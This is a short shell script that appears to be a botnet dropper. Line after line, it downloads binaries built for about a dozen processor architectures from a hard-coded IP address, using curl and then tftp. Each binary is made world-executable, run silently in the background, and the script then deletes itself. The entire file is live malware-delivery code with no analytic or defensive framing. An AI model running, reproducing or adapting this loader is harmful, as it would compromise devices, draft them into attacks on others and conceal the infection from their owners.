#!/bin/sh
curl http://31.97.147.189/systemcl/arm; chmod 777 arm; ./arm arm
curl http://31.97.147.189/systemcl/arm5; chmod 777 arm5; ./arm5 arm5
curl http://31.97.147.189/systemcl/arm6; chmod 777 arm6; ./arm6 arm6
curl http://31.97.147.189/systemcl/arm7; chmod 777 arm7; ./arm7 arm7
curl http://31.97.147.189/systemcl/m68k; chmod 777 m68k; ./m68k m68k
curl http://31.97.147.189/systemcl/mips; chmod 777 mips; ./mips mips
curl http://31.97.147.189/systemcl/mpsl; chmod 777 mpsl; ./mpsl mpsl
curl http://31.97.147.189/systemcl/ppc; chmod 777 ppc; ./ppc ppc
curl http://31.97.147.189/systemcl/sh4; chmod 777 sh4; ./sh4 sh4
curl http://31.97.147.189/systemcl/spc; chmod 777 spc; ./spc spc
curl http://31.97.147.189/systemcl/x86; chmod 777 x86; ./x86 x86
curl http://31.97.147.189/systemcl/x86_64; chmod 777 x86_64; ./x86_64 x86_64
tftp 31.97.147.189 -c get arc 2>/dev/null || tftp -r arc -g 31.97.147.189 2>/dev/null; chmod 777 arc; ./arc arc 2>/dev/null &
tftp 31.97.147.189 -c get arm 2>/dev/null || tftp -r arm -g 31.97.147.189 2>/dev/null; chmod 777 arm; ./arm arm 2>/dev/null &
tftp 31.97.147.189 -c get arm5 2>/dev/null || tftp -r arm5 -g 31.97.147.189 2>/dev/null; chmod 777 arm5; ./arm5 arm5 2>/dev/null &
tftp 31.97.147.189 -c get arm6 2>/dev/null || tftp -r arm6 -g 31.97.147.189 2>/dev/null; chmod 777 arm6; ./arm6 arm6 2>/dev/null &
tftp 31.97.147.189 -c get arm7 2>/dev/null || tftp -r arm7 -g 31.97.147.189 2>/dev/null; chmod 777 arm7; ./arm7 arm7 2>/dev/null &
tftp 31.97.147.189 -c get m68k 2>/dev/null || tftp -r m68k -g 31.97.147.189 2>/dev/null; chmod 777 m68k; ./m68k m68k 2>/dev/null &
tftp 31.97.147.189 -c get mips 2>/dev/null || tftp -r mips -g 31.97.147.189 2>/dev/null; chmod 777 mips; ./mips mips 2>/dev/null &
tftp 31.97.147.189 -c get mpsl 2>/dev/null || tftp -r mpsl -g 31.97.147.189 2>/dev/null; chmod 777 mpsl; ./mpsl mpsl 2>/dev/null &
tftp 31.97.147.189 -c get ppc 2>/dev/null || tftp -r ppc -g 31.97.147.189 2>/dev/null; chmod 777 ppc; ./ppc ppc 2>/dev/null &
tftp 31.97.147.189 -c get sh4 2>/dev/null || tftp -r sh4 -g 31.97.147.189 2>/dev/null; chmod 777 sh4; ./sh4 sh4 2>/dev/null &
tftp 31.97.147.189 -c get spc 2>/dev/null || tftp -r spc -g 31.97.147.189 2>/dev/null; chmod 777 spc; ./spc spc 2>/dev/null &
tftp 31.97.147.189 -c get x86 2>/dev/null || tftp -r x86 -g 31.97.147.189 2>/dev/null; chmod 777 x86; ./x86 x86 2>/dev/null &
tftp 31.97.147.189 -c get x86_64 2>/dev/null || tftp -r x86_64 -g 31.97.147.189 2>/dev/null; chmod 777 x86_64; ./x86_64 x86_64 2>/dev/null &

rm $0